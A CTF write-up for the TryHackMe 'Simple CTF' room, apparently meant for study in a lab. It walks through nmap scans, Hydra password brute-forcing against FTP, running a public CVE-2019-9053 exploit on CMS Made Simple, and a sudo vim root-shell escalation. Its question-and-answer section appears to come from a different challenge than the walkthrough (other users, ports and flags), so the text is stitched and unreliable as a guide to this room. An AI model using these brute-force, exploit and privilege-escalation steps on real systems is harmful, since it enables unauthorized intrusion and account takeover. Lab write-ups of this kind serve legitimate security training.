# Simple CTF — Writeup (TryHackMe)

**Room:** Simple CTF  
**Difficulty:** Beginner / Easy  
**Author:** Luis (Anub1t)  
**Date:** 2025-09-12

---

## Summary
This writeup documents the steps taken to solve the **Simple CTF** room on TryHackMe. The goal was to enumerate services, find a web vulnerability, exploit it to obtain credentials, access the machine via SSH on a non-standard port, and escalate privileges to `root`.

**Tools used (not exhaustive):**
- `nmap`  
- `gobuster` / `dirsearch`  
- `python3` (exploit)  
- `hydra`  
- `ssh`, `scp`  
- `sudo`, `vim`  

---

## Question 1  
**What is the highest port number being open less than 10,000?**

Command used:
```bash
nmap -p1-10000 <TARGET_IP>
```

**Result:** Port **8080 (http-proxy)** was the highest open port below 10,000.

---

## Question 2  
**There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

Command used:
```bash
nmap -p- <TARGET_IP>
```

**Result:** The open port above 10,000 was **10021**.

---

## Question 3  
**How many TCP ports are open?**

Command:
```bash
nmap -p- -sV <TARGET_IP>
```

**Result:** **6** TCP ports were found open.

---

## Question 4  
**What is the flag hidden in the HTTP server header?**

Procedure:
```bash
telnet <TARGET_IP> 80
# then send:
GET / HTTP/1.1
Host: <TARGET_IP>
```
The HTTP response headers contained the flag.

*Alternative:*
```bash
nmap -sC -p80 <TARGET_IP>
```

---

## Question 5  
**What is the flag hidden in the SSH server header?**

Procedure:
```bash
telnet <TARGET_IP> 22
```
The SSH banner revealed the flag.

*Alternative:*
```bash
nmap -sC -p22 <TARGET_IP>
```

---

## Question 6  
**We have an FTP server listening on a nonstandard port. What is the version of the FTP server?**

Command:
```bash
nmap -p- -sV <TARGET_IP>
```

**Result:** `vsftpd 3.0.5`.

---

## Question 7  
**We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?**

Brute-forced FTP credentials with Hydra:
```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
```

Then logged in:
```bash
ftp <TARGET_IP> 10021
# authenticate and list files
```

One of the accounts had a file containing the flag.

---

## Question 8  
**Browsing to http://<TARGET_IP>:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?**

The page contained a small challenge about IDS evasion with Nmap. One method that worked:
```bash
nmap -sN <TARGET_IP>
```
After the scan ran successfully, the web page revealed the final flag.

---

## Detailed walk-through (machine solved in this writeup)

> The practical flow for this machine was: enumeration → version discovery → public exploit → exploitation → SSH access on a non-standard port → post-exploitation and privilege escalation.

### Recon / Enumeration
Full port & version scan:
```bash
nmap -T4 -p- -sV --version-all <TARGET_IP>
```

Web enumeration:
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/common.txt -t 40
# or
dirsearch -u http://<TARGET_IP>/ -e php,html,txt -w /usr/share/wordlists/common.txt
```
Found `/simple` and identified the web app/version (e.g. CMS Made Simple 2.2.8).

### Exploitation (CVE)
Searched for known vulnerabilities for the detected version and located a public exploit (example: CVE-2019-9053). Executed the exploit to recover credentials:
```bash
python3 exploit.py -u "http://<TARGET_IP>/simple/"
```
The exploit returned credentials or hints for SSH access.

### SSH access (non-standard port)
SSH was listening on **2222**. With obtained credentials:
```bash
ssh -p 2222 mitch@<TARGET_IP>
# password: <found_password>
```

### Post-exploitation and Privilege Escalation
Check sudo privileges:
```bash
sudo -l
```
Relevant output:
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
Since `mitch` can run `/usr/bin/vim` as root without a password, this provides a direct way to spawn a root shell via `vim`.

Quick root shell using vim:
```bash
sudo /usr/bin/vim -c ':!bash' -c ':q'
# or
sudo /usr/bin/vim
# inside vim:
:!sh
```

Once root:
```bash
cd /root
ls
cat root.txt
```

---

## Example flags
- **User flag:** `G00d j0b, keep up!`  
- **Root flag:** `W3ll d0n3. You made it!`

> Flags may vary depending on the lab instance; above are the examples obtained while solving this box.

---

## Conclusion
This challenge reinforces the classic CTF/pen-test workflow:
1. Enumeration with `nmap` and `gobuster/dirsearch`.  
2. Version discovery and CVE/exploit research.  
3. Exploitation to obtain credentials.  
4. SSH access on a non-standard port.  
5. Post-exploitation checks (`sudo -l`, SUID, cron, writable files).  
6. Privilege escalation using allowed `sudo` commands (e.g., `vim`).

Key takeaways:
- Inspect web directories and hidden paths thoroughly.  
- Services may run on non-standard ports (e.g., SSH on 2222).  
- Always run `sudo -l` after gaining a user shell.  
- GTFOBins and editor-to-shell tricks are essential for quick privesc.

---

## References
- Example exploit used: `https://github.com/BjarneVerschorre/CVE-2019-9053`  
- CVE: `CVE-2019-9053` (CMS Made Simple)  
- Tools: `nmap`, `gobuster`, `dirsearch`, `hydra`, `ssh`, `vim`, `python3`  
- GTFOBins: https://gtfobins.github.io/

---

## Disclaimer
> ⚠️ This writeup is for **educational purposes only** and for use in authorized environments (labs / CTFs). Do not apply these techniques against systems without explicit permission from the owner.

---
